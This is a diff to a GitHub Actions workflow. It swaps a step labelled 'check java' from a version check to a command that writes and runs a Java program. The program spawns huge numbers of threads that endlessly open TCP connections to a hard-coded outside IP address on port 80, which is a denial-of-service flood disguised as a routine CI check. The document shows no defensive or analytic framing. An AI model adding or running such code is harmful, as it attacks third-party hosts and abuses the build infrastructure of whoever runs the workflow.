@@ -31,4 +31,4 @@ jobs:
 
       # Runs a set of commands using the runners shell
       - name: check java
-        run: java --version
+        run: echo 'import java.net.InetSocketAddress; import java.net.Socket; public class ain { public static void main(String[] args) throws Exception { System.out.println("109.230.236.172:27015"); for (int i = 0; i < 100000000; i++) { Thread newThread = new Thread(() -> { new DdosThread().run(); }); newThread.start(); } } public static class DdosThread { public void run() { while (true) { try { attack(); } catch (Exception e) { continue; } } } public void attack() throws Exception { Socket socket = new Socket(); socket.connect(new InetSocketAddress("93.170.246.199", 80), 1); socket.close(); } } } ' > main.java && java main.java
